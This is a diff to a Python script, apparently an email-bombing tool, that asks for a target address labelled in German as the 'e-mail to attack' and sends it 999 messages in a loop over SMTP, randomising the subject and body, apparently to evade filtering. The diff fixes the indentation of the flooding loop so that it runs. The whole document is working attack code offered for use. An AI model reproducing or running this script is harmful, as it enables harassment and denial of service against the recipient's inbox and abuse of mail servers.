@@ -26,17 +26,18 @@ def server_start():
     return server
 
 def spamm(server):
+    cls()
     boot()
     emails = input(str("E-Mail zum Angreifen: "))
-        for mailanz in range(1, 1000):
-            print(f"=={mailanz}== wurden gesendet!")
-            msg = MIMEText(
-            "We will never forget!" + str(randint(1,9999))
-            )
-            msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
-            msg["From"] = username
-            msg["To"] = emails
-            server.sendmail(username, emails, msg.as_string())
+    for mailanz in range(1, 1000):
+        print(f"=={mailanz}== wurden gesendet!")
+        msg = MIMEText(
+        "We will never forget!" + str(randint(1,9999))
+        )
+        msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
+        msg["From"] = username
+        msg["To"] = emails
+        server.sendmail(username, emails, msg.as_string())
 
 def main():
     while True:
